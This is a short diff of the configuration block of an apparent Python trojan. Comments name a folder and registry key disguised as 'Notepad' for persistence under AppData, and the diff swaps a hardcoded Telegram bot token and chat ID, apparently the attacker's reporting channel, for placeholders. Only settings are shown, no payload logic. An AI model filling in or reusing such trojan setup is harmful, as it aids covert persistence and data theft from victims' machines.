@@ -4,8 +4,8 @@ import os
 
 DIRNAME = "Notepad" #Trojan Folder Name
 NAMEOFREGKEY = "Notepad" #Registry Key to be named
-TOKEN = "5422701932:AAFgYpceFm32H_QB6ZN6E0ohvviB9H17PyI"
-CHAT_ID = "1747538159"
+TOKEN = "YOUR TOKEN"
+CHAT_ID = "YOUR CHATID"
 
 
 APPDATADIR = os.getenv("Appdata")+f"\\{DIRNAME}"
